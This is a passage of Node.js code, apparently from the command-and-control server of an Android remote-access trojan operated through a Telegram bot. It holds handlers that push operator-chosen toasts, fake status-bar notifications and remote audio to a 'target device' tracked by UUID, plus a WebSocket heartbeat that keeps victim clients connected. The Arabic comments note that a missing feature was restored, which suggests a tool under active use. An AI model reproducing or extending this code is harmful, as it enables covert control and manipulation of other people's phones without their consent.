    appBot.sendMessage(id, "°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n" + "• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }

  // ✅ زر: إظهار الإشعار (كان مفقوداً تماماً في النسخة السابقة)
  if (command == "show_notification") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n" + "• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }

  // زر: تشغيل الصوت
  if (command == "play_audio") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل رابط الصوت الذي تريد تشغيله\n\n" + "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }
});

// ============ Heartbeat كل 5 ثواني ============
setInterval(function () {
  appSocket.clients.forEach(function (ws) {
    ws.send("ping");
  });
  try {
    axios.get(address).then((res) => { return ""; });
  } catch (e) {}
}, 5000);

// ============ تشغيل الخادم ============
appServer.listen(process.env.PORT || 8999);